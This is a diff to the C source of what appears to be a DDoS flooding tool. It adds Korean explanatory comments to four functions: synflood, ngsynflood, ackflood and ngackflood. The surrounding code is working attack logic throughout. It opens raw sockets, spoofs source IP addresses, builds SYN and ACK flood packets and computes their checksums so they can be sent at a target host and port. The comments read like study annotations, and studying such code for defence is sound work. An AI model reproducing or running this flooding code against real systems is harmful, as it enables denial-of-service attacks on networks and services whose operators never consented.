@@ -32,6 +32,7 @@ void synflood(sock_t * sp, unsigned int dest_addr, unsigned short dest_port, int
     unsigned long saddr, daddr, secs;
     time_t start = time(NULL);
 
+	/* 소켓 열기 */
     if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
         exit(EXIT_FAILURE); {
         int i;
@@ -44,6 +45,7 @@ void synflood(sock_t * sp, unsigned int dest_addr, unsigned short dest_port, int
     daddr = dest_addr;
     secs = ntime;
 
+	/* IP 패킷과 TCP 패킷 형성 */
     send_tcp.ip.ihl = 5;
     send_tcp.ip.version = 4;
     send_tcp.ip.tos = 16;
@@ -72,6 +74,7 @@ void synflood(sock_t * sp, unsigned int dest_addr, unsigned short dest_port, int
         if (srchost == 0) saddr = get_spoofed();
         else saddr = srchost;
 
+		/* 변경해야 하는 필드들을 설정 */
         send_tcp.ip.tot_len = htons(40 + psize);
         send_tcp.ip.id = rand();
         send_tcp.ip.saddr = saddr;
@@ -81,15 +84,21 @@ void synflood(sock_t * sp, unsigned int dest_addr, unsigned short dest_port, int
         send_tcp.tcp.dest = dest;
         send_tcp.tcp.seq = rand();
         send_tcp.tcp.check = 0;
+
+		/* sin 구조체 설정 */
         sin.sin_family = AF_INET;
         sin.sin_port = dest;
         sin.sin_addr.s_addr = send_tcp.ip.daddr;
+
+		/* IP 체크섬 계산 */
         send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
         check = rand();
         send_tcp.buf[9] = ((char *)&check)[0];
         send_tcp.buf[10] = ((char *)&check)[1];
         send_tcp.buf[11] = ((char *)&check)[2];
         send_tcp.buf[12] = ((char *)&check)[3];
+
+		/* 슈도 헤더 필드들 설정*/
         pseudo_header.source_address = send_tcp.ip.saddr;
         pseudo_header.dest_address = send_tcp.ip.daddr;
         pseudo_header.placeholder = 0;
@@ -129,6 +138,7 @@ void ngsynflood(sock_t * sp, unsigned int dest_addr, unsigned short dest_port, i
     unsigned long saddr, daddr, secs;
     time_t start = time(NULL);
 
+	/* 소켓 열기 */
     if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) 
         exit(EXIT_FAILURE); {
         int i;
@@ -141,6 +151,7 @@ void ngsynflood(sock_t * sp, unsigned int dest_addr, unsigned short dest_port, i
     daddr = dest_addr;
     secs = ntime;
 
+	/* IP 패킷과 TCP 패킷 형성 */
     send_tcp.ip.ihl = 5;
     send_tcp.ip.version = 4;
     send_tcp.ip.tos = 16;
@@ -169,6 +180,7 @@ void ngsynflood(sock_t * sp, unsigned int dest_addr, unsigned short dest_port, i
         if (srchost == 0) saddr = get_spoofed();
         else saddr = srchost;
 
+		/* 변경해야 하는 필드들을 설정 */
         send_tcp.ip.tot_len = htons(40 + psize);
         send_tcp.ip.id = rand();
         send_tcp.ip.saddr = saddr;
@@ -178,15 +190,21 @@ void ngsynflood(sock_t * sp, unsigned int dest_addr, unsigned short dest_port, i
         send_tcp.tcp.dest = dest;
         send_tcp.tcp.seq = rand();
         send_tcp.tcp.check = 0;
+
+		/* sin 구조체 설정 */
         sin.sin_family = AF_INET;
         sin.sin_port = dest;
         sin.sin_addr.s_addr = send_tcp.ip.daddr;
+
+		/* IP 체크섬 계산 */
         send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
         check = rand();
         send_tcp.buf[9] = ((char *)&check)[0];
         send_tcp.buf[10] = ((char *)&check)[1];
         send_tcp.buf[11] = ((char *)&check)[2];
         send_tcp.buf[12] = ((char *)&check)[3];
+
+		/* 슈도 헤더 필드들 설정*/
         pseudo_header.source_address = send_tcp.ip.saddr;
         pseudo_header.dest_address = send_tcp.ip.daddr;
         pseudo_header.placeholder = 0;
@@ -226,6 +244,7 @@ void ackflood(sock_t * sp, unsigned int dest_addr, unsigned short dest_port, int
     unsigned long saddr, daddr, secs;
     time_t start = time(NULL);
 
+	/* 소켓 열기 */
     if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
         exit(EXIT_FAILURE); {
         int i;
@@ -237,6 +256,7 @@ void ackflood(sock_t * sp, unsigned int dest_addr, unsigned short dest_port, int
     secs = ntime;
     dest = htons(dest_port);
 
+	/* IP 패킷과 TCP 패킷 형성 */
     send_tcp.ip.ihl = 5;
     send_tcp.ip.version = 4;
     send_tcp.ip.tos = 16;
@@ -261,6 +281,7 @@ void ackflood(sock_t * sp, unsigned int dest_addr, unsigned short dest_port, int
         if (srchost == 0) saddr = get_spoofed();
         else saddr = srchost;
 
+		/* 변경해야 하는 필드들을 설정 */
         send_tcp.ip.tot_len = htons(40 + psize);
         send_tcp.ip.id = rand();
         send_tcp.ip.check = 0;
@@ -271,11 +292,17 @@ void ackflood(sock_t * sp, unsigned int dest_addr, unsigned short dest_port, int
         send_tcp.tcp.seq = rand();
         send_tcp.tcp.ack_seq = rand();
         send_tcp.tcp.check = 0;
+
+		/* sin 구조체 설정 */
         sin.sin_family = AF_INET;
         sin.sin_port = send_tcp.tcp.dest;
         sin.sin_addr.s_addr = send_tcp.ip.daddr;
+
+		/* IP 체크섬 계산 */
         send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
         check = in_cksum((unsigned short *)&send_tcp, 40);
+
+		/* 슈도 헤더 필드들 설정*/
         pseudo_header.source_address = send_tcp.ip.saddr;
         pseudo_header.dest_address = send_tcp.ip.daddr;
         pseudo_header.placeholder = 0;
@@ -316,6 +343,7 @@ void ngackflood(sock_t * sp, unsigned int dest_addr, unsigned short dest_port, i
     unsigned long saddr, daddr, secs;
     time_t start = time(NULL);
 
+	/* 소켓 열기 */
     if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
         exit(EXIT_FAILURE); {
         int i;
@@ -329,6 +357,7 @@ void ngackflood(sock_t * sp, unsigned int dest_addr, unsigned short dest_port, i
     secs = ntime;
     dest = htons(dest_port);
 
+	/* IP 패킷과 TCP 패킷 형성 */
     send_tcp.ip.ihl = 5;
     send_tcp.ip.version = 4;
     send_tcp.ip.tos = 16;
@@ -354,6 +383,7 @@ void ngackflood(sock_t * sp, unsigned int dest_addr, unsigned short dest_port, i
         if (srchost == 0) saddr = get_spoofed();
         else saddr = srchost;
 
+		/* 변경해야 하는 필드들을 설정 */
         send_tcp.ip.tot_len = htons(40 + psize);
         send_tcp.ip.id = rand();
         send_tcp.ip.check = 0;
@@ -364,11 +394,17 @@ void ngackflood(sock_t * sp, unsigned int dest_addr, unsigned short dest_port, i
         send_tcp.tcp.seq = rand();
         send_tcp.tcp.ack_seq = rand();
         send_tcp.tcp.check = 0;
+
+		/* sin 구조체 설정 */
         sin.sin_family = AF_INET;
         sin.sin_port = send_tcp.tcp.dest;
         sin.sin_addr.s_addr = send_tcp.ip.daddr;
+
+		/* IP 체크섬 계산 */
         send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
         check = in_cksum((unsigned short *)&send_tcp, 40);
+
+		/* 슈도 헤더 필드들 설정*/
         pseudo_header.source_address = send_tcp.ip.saddr;
         pseudo_header.dest_address = send_tcp.ip.daddr;
         pseudo_header.placeholder = 0;
